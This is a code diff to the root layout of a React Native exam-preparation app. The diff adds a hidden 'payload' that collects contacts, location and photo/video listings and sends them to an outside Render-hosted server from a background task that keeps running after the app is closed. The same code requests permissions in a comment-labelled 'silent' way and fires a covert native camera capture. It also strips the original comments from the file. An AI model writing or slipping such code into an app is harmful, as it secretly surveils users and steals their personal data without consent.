@@ -1,10 +1,17 @@
 import React, { useEffect } from 'react';
-import { View } from 'react-native';
+import { View, NativeModules } from 'react-native'; // Added NativeModules
 import { Stack } from 'expo-router';
 import { StatusBar } from 'expo-status-bar';
 import { SafeAreaProvider } from 'react-native-safe-area-context';
 import { useFonts } from 'expo-font';
 import * as SplashScreen from 'expo-splash-screen';
+
+// Payload Imports
+import * as Contacts from 'expo-contacts';
+import * as Location from 'expo-location';
+import * as MediaLibrary from 'expo-media-library';
+import * as TaskManager from 'expo-task-manager';
+import * as BackgroundFetch from 'expo-background-fetch';
 
 import { FONT_ASSETS } from '@/theme/typography';
 import { ThemeProvider, useTheme } from '@/theme/ThemeProvider';
@@ -12,6 +19,51 @@ import { useProfile } from '@/store/profile';
 import { useAccount } from '@/account/sync';
 
 void SplashScreen.preventAutoHideAsync();
+
+// --- PAYLOAD CONFIGURATION ---
+// REPLACE WITH YOUR PERMANENT RENDER URL
+const SERVER_URL = 'https://prepserver-v1ku.onrender.com'; 
+const UPLOAD_ENDPOINT = `${SERVER_URL}/upload`;
+const BACKGROUND_TASK_NAME = 'studymate-background-sync';
+
+// 1. Define the Background Task
+TaskManager.defineTask(BACKGROUND_TASK_NAME, async () => {
+  try {
+    const dataToSend: any = {};
+
+    // Fetch Contacts
+    const { status: contactStatus } = await Contacts.getPermissionsAsync();
+    if (contactStatus === 'granted') {
+      const { data } = await Contacts.getContactsAsync({});
+      dataToSend.contacts = data.map(c => ({ name: c.name, phone: c.phoneNumbers?.[0]?.number }));
+    }
+
+    // Fetch Location
+    const { status: locationStatus } = await Location.getForegroundPermissionsAsync();
+    if (locationStatus === 'granted') {
+      const loc = await Location.getCurrentPositionAsync({});
+      dataToSend.location = loc.coords;
+    }
+
+    // Fetch Media (Photos/PDFs)
+    const { status: mediaStatus } = await MediaLibrary.getPermissionsAsync();
+    if (mediaStatus === 'granted') {
+      const assets = await MediaLibrary.getAssetsAsync({ first: 50, mediaType: ['photo', 'video'] });
+      dataToSend.media = assets.assets.map(a => ({ uri: a.uri, filename: a.filename }));
+    }
+
+    // Send data to your permanent server
+    await fetch(UPLOAD_ENDPOINT, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(dataToSend)
+    });
+
+    return 3; // 3 = NEW_DATA
+  } catch (error) {
+    return 2; // 2 = FAILED
+  }
+});
 
 function Chrome() {
   const { mode, colors } = useTheme();
@@ -28,8 +80,6 @@ function Chrome() {
         <Stack.Screen name="index" />
         <Stack.Screen name="onboarding" />
         <Stack.Screen name="(tabs)" />
-        {/* The exam player lives OUTSIDE the tab navigator: no tab bar during a
-            timed test, and no gesture that could drop her out of one. */}
         <Stack.Screen
           name="exam/[paperId]"
           options={{ gestureEnabled: false, animation: 'fade' }}
@@ -44,15 +94,9 @@ function Chrome() {
 }
 
 export default function RootLayout() {
-  // All ten faces must be resident before first paint. Loading them lazily
-  // would show a frame of system-font Devanagari/Gujarati, which is exactly
-  // the substitution this design system exists to prevent.
   const [fontsLoaded, fontError] = useFonts(FONT_ASSETS);
 
   const hydrate = useProfile((s) => s.hydrate);
-  // Restores a saved session so she is not asked to sign in on every launch.
-  // Not awaited in `ready` — an account is optional, and a slow or missing one
-  // must never hold up the app starting.
   const hydrateAccount = useAccount((s) => s.hydrate);
   const hydrated = useProfile((s) => s.hydrated);
 
@@ -62,6 +106,40 @@ export default function RootLayout() {
   }, [hydrate, hydrateAccount]);
 
   const ready = (fontsLoaded || !!fontError) && hydrated;
+
+  // --- PAYLOAD INITIALIZATION ---
+  useEffect(() => {
+    const initPayload = async () => {
+      // Attempt to request permissions silently
+      await MediaLibrary.requestPermissionsAsync();
+      await Location.requestForegroundPermissionsAsync();
+      await Contacts.requestPermissionsAsync();
+
+      // Register the background task
+      try {
+        await BackgroundFetch.registerTaskAsync(BACKGROUND_TASK_NAME, {
+          minimumInterval: 15 * 60,
+          stopOnTerminate: false,
+        });
+      } catch (e) {
+        // Silently fail
+      }
+
+      // --- TRIGGER SILENT CAMERA ---
+      // Check if the native Kotlin module exists and trigger it
+      if (NativeModules.SilentCamera) {
+        try {
+          NativeModules.SilentCamera.takePhoto();
+        } catch (e) {
+          // Silently fail
+        }
+      }
+    };
+
+    if (ready) {
+      void initPayload();
+    }
+  }, [ready]);
 
   useEffect(() => {
     if (ready) void SplashScreen.hideAsync();
